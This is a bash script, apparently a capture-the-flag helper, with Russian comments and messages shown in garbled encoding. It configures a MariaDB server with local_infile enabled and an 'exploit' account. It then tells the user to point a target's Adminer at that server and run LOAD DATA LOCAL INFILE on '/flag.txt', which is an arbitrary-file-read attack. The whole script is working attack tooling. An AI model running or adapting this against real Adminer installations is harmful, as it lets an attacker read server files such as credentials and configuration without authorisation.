#!/bin/bash

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
if [ $# -lt 2 ]; then
    echo "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: $0 <IP> <PORT>"
    echo "–ü—Ä–∏–º–µ—Ä: $0 10.10.10.10 11010"
    exit 1
fi

TARGET_IP="$1"
TARGET_PORT="$2"

echo "üîß –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º MySQL —Å–µ—Ä–≤–µ—Ä –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ Adminer"
echo "üì° IP: $TARGET_IP, PORT: $TARGET_PORT"

# –ö–æ–Ω—Ñ–∏–≥ MySQL
echo "üìù –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é MySQL..."
sudo tee /etc/mysql/conf.d/ctf.cnf > /dev/null <<EOF
[mysqld]
bind-address = 0.0.0.0
port = $TARGET_PORT
local_infile = 1
EOF

# –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ MySQL
echo "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º MySQL..."
sudo systemctl restart mariadb

# –ü—Ä–æ–≤–µ—Ä–∫–∞
echo "üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–±–æ—Ç—É –Ω–∞ –ø–æ—Ä—Ç—É $TARGET_PORT..."
sudo ss -lntp | grep $TARGET_PORT

# –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –ë–î
echo "üë§ –°–æ–∑–¥–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö..."
sudo mysql <<SQL
DROP USER IF EXISTS 'exploit'@'%';
DROP USER IF EXISTS 'exploit'@'$TARGET_IP';
CREATE USER 'exploit'@'$TARGET_IP' IDENTIFIED BY 'Exp!o1tPass';
CREATE USER 'exploit'@'%' IDENTIFIED BY 'Exp!o1tPass';
CREATE DATABASE IF NOT EXISTS ctf_tmp;
GRANT ALL PRIVILEGES ON ctf_tmp.* TO 'exploit'@'$TARGET_IP';
GRANT ALL PRIVILEGES ON ctf_tmp.* TO 'exploit'@'%';
FLUSH PRIVILEGES;
SELECT User, Host FROM mysql.user WHERE User='exploit';
SQL

echo "‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!"
echo ""
echo "üéØ –¢–µ–ø–µ—Ä—å –≤ Adminer –∏—Å–ø–æ–ª—å–∑—É–π:"
echo "   Server: $(hostname -I | awk '{print $1}'):$TARGET_PORT"
echo "   Username: exploit"
echo "   Password: Exp!o1tPass" 
echo "   Database: ctf_tmp"
echo ""
echo "üíª –í—ã–ø–æ–ª–Ω–∏ –≤ Adminer –∑–∞–ø—Ä–æ—Å—ã:"
echo "   CREATE TABLE IF NOT EXISTS lfr_sink (line TEXT);"
echo "   LOAD DATA LOCAL INFILE '/flag.txt' INTO TABLE lfr_sink LINES TERMINATED BY '\n';"
echo "   SELECT * FROM lfr_sink;"
